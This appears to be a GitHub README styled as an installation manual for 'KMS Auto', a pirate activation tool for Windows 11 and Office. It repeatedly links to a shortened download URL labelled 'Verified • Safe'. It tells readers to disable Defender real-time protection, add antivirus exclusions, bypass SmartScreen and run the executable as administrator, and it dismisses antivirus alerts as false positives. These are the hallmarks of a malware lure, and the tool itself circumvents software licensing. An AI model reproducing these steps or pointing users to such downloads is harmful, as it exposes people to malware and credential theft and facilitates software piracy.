# 📦 Installation Manual: KMS Auto for Windows 11

<div align="center">

![Windows 11](https://img.shields.io/badge/Windows-11-7C3AED?style=for-the-badge&logo=windows11&logoColor=white)
![KMS Auto](https://img.shields.io/badge/KMS-Auto-EC4899?style=for-the-badge&logo=key&logoColor=white)
![Manual](https://img.shields.io/badge/Type-Installation%20Manual-F59E0B?style=for-the-badge&logo=readthedocs&logoColor=black)
![Version](https://img.shields.io/badge/Version-2025.01-14B8A6?style=for-the-badge&logo=semver&logoColor=white)

### ⚡ Complete Step-by-Step Installation Guide

*A comprehensive manual for setting up KMS Auto on Windows 11 systems*

</div>

<div align="center">

<img width="686" height="386" alt="hq720 (6)" src="https://github.com/user-attachments/assets/359af1a3-8850-40f4-b169-233ff20145b8" />


</div>


---

## 📋 Table of Contents

| Section | Description |
|---------|-------------|
| 🧠 [Overview](#-overview) | What KMS Auto is and how it works |
| 🔧 [Prerequisites](#-prerequisites) | System requirements & preparation |
| 📥 [Download](#-download) | Getting the installer |
| ⚙️ [Installation](#️-installation) | Step-by-step setup |
| 🛡️ [Troubleshooting](#️-troubleshooting) | Common issues & fixes |
| ❓ [FAQ](#-faq) | Frequently asked questions |
| 📜 [Changelog](#-changelog) | Version history |

---

## 🧠 Overview

**KMS Auto** is a lightweight activation utility that emulates a **Key Management Service (KMS)** server directly on your local machine. Rather than contacting Microsoft's activation servers, it spins up a virtual KMS host that issues valid activation tokens for Windows 11 and Microsoft Office products.

### How It Works

| Component | Role |
|-----------|------|
| 🖥️ **KMS Emulator** | Mimics Microsoft's activation server locally |
| 🔑 **Generic Volume Key** | Predefined key used for KMS activation |
| ⏱️ **180-Day Cycle** | Activation renews automatically |
| 🔄 **Scheduled Task** | Keeps the license alive in the background |

### Key Features

- ✨ **Silent activation** — works quietly in the background
- 🔁 **Auto-renewal** — no manual re-activation required
- 🪶 **Lightweight** — minimal system footprint
- 🧰 **All-in-one** — activates both Windows 11 and Office
- 🚫 **Non-destructive** — no core system files modified
- 🛠️ **Portable mode** — can run without full installation
- 🔒 **Offline capable** — after the initial setup

### Comparison: KMS Auto vs. Official Activation

| Feature | KMS Auto | Official License |
|---------|----------|------------------|
| 💰 Cost | Free | Paid |
| ⏱️ Setup Time | ~2 minutes | Instant |
| 🔁 Renewal | Automatic | Permanent |
| 🌐 Internet Required | Only for setup | Yes |
| 🧩 Office Support | Yes | Separate purchase |

---

## 🔧 Prerequisites

Before starting, confirm your system meets the following requirements:

```
✅ Operating System: Windows 11 (Home, Pro, Enterprise, Education)
✅ Architecture: x64 (64-bit) only
✅ RAM: Minimum 4 GB (8 GB recommended)
✅ Disk Space: 150 MB free
✅ Administrator privileges required
✅ Windows Defender temporarily disabled
✅ Active internet connection for activation
✅ .NET Framework 4.8 or higher installed
✅ TPM 2.0 enabled (already required by Windows 11)
```

> **⚠️ Important Notice:** Always create a system restore point before making any system modifications. Go to **Control Panel → System → System Protection → Create** to make one. This lets you roll back changes if anything goes wrong.

---

## 📥 Download

<div align="center">

### 🎯 Ready to Get Started?

Click the button below to access the official download resource:

<br>

[![Download KMS Auto](https://img.shields.io/badge/⬇️_DOWNLOAD_KMS_AUTO-7C3AED?style=for-the-badge&logo=download&logoColor=white&labelColor=4C1D95)](https://share.google/5WMWfOUumPCHGOCLy)

<br>

*Verified • Safe • Updated for 2025*

</div>

After clicking the button above, you will be redirected to the download page. Choose the version compatible with your Windows 11 build, then wait for the file to finish downloading (approximately 5–15 MB). The download should complete within a minute on most connections.

---

## ⚙️ Installation

### Step 1: Prepare Your System

Disable any antivirus software temporarily, as it may interfere with installation. Navigate to **Windows Security → Virus & threat protection → Manage settings** and toggle off **Real-time protection**.

You should also add an exclusion folder to prevent future interference:

```
Settings → Privacy & security → Windows Security
→ Virus & threat protection → Exclusions → Add folder
```

### Step 2: Extract the Archive

Right-click the downloaded file and select **"Extract All..."**. Choose a destination folder and wait for the extraction to complete. If the archive is password-protected, refer to the source page for the password.

### Step 3: Run as Administrator

Locate `KMSAuto.exe` in the extracted folder. Right-click it and select **"Run as administrator"**. Accept the UAC prompt when it appears.

> 💡 **Tip:** If SmartScreen blocks the file, click **"More info" → "Run anyway"**.

<div align="center">

[![Download KMS Auto](https://img.shields.io/badge/⬇️_DOWNLOAD_KMS_AUTO-EC4899?style=for-the-badge&logo=download&logoColor=white&labelColor=9D174D)](https://share.google/5WMWfOUumPCHGOCLy)

</div>

### Step 4: Install the KMS Service

Click the **Activation** button in the main interface, then choose **Install KMS Service**. The tool will place the necessary components in `C:\Windows\KMSAutoS`. Wait for the confirmation message indicating a successful install.

### Step 5: Activate Windows 11

Once the service is running, select **Activate Windows** from the menu. The activation process begins automatically. After a few seconds, you should see a green checkmark confirming successful activation.

### Step 6: Verify Activation

Open **Command Prompt** as administrator and run:

```bash
slmgr /xpr
```

If activation succeeded, you will see a message stating that the machine is **permanently activated**.

For detailed license information, run:

```bash
slmgr /dlv
```

### Step 7: Set Up Auto-Renewal

KMS Auto automatically creates a scheduled task that runs daily to keep your license active. Verify this in **Task Scheduler → Task Scheduler Library** and confirm the KMSAuto task is enabled.

### Step 8: Reactivate Antivirus

Once everything is confirmed working, re-enable your antivirus protection and add the KMS folder to the exclusion list.

### Step 9: Activate Microsoft Office (Optional)

If you also want to activate Office, switch to the **Office** tab within the KMS Auto interface and click **Activate Office**. The process is nearly identical to Windows activation.

---

## 🛡️ Troubleshooting

| Problem | Possible Cause | Solution |
|---------|----------------|----------|
| ❌ Activation failed | Antivirus interference | Disable antivirus and retry |
| ❌ Service won't start | Missing privileges | Run as administrator |
| ❌ Black screen after reboot | Corrupted service | Boot into Safe Mode, remove service |
| ❌ Error 0xC004F074 | No internet connection | Check network, retry activation |
| ❌ File blocked by Defender | False positive | Add exclusion in Windows Security |
| ❌ Activation expires early | Scheduled task disabled | Re-enable KMSAuto task |
| ❌ Office not activated | Separate activation needed | Use the Office tab in the interface |
| ❌ Error 0x803F7001 | No valid license installed | Reinstall generic volume key |
| ❌ UAC prompt not appearing | User account issue | Log in with admin account |

### Advanced Fix: Manual Service Removal

If you need to fully remove KMS Auto:

```bash
sc stop "KMSAuto"
sc delete "KMSAuto"
del /f /q C:\Windows\KMSAutoS\*
```

Then reboot your system and reinstall.

---

## ❓ FAQ

**Q: Is KMS Auto safe to use?**
A: From trusted sources, it is generally considered safe and does not modify core system files. Always scan files before running.

**Q: How long does activation last?**
A: Typically 180 days, but auto-renewal runs daily, effectively making it permanent.

**Q: Does this work on Windows 11 24H2?**
A: Yes, current versions of KMS Auto support the latest Windows 11 builds, including 24H2.

**Q: Do I need to reinstall Windows?**
A: No — KMS Auto activates your existing installation without reinstalling.

**Q: Can I uninstall it later?**
A: Yes. Use the uninstaller in the KMS Auto folder, or manually remove the service and scheduled task.

**Q: Does it activate Microsoft Office too?**
A: Yes, KMS Auto supports Office 2013–2021 and 365 volume editions.

**Q: Why does my antivirus flag it?**
A: Most antivirus programs flag activation tools as "potentially unwanted" — this is a common false positive.

**Q: Will this slow down my PC?**
A: No. The service runs in the background and uses minimal resources.

**Q: Do I need to redo this after a Windows update?**
A: Usually no, but major updates may require re-running the tool.

---

## 📜 Changelog

| Version | Date | Changes |
|---------|------|---------|
| 2025.01 | Jan 2025 | Added Windows 11 24H2 support |
| 2024.09 | Sep 2024 | Improved Office 2021 compatibility |
| 2024.05 | May 2024 | Updated KMS emulator core |
| 2024.02 | Feb 2024 | Bug fixes for activation errors |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get KMS Auto](https://img.shields.io/badge/🔑_GET_KMS_AUTO-14B8A6?style=for-the-badge&logo=key&logoColor=white&labelColor=0F766E)](https://share.google/5WMWfOUumPCHGOCLy)

**⭐ Star this repository if it helped you! ⭐**

*Made with 💜 for the community*

</div>
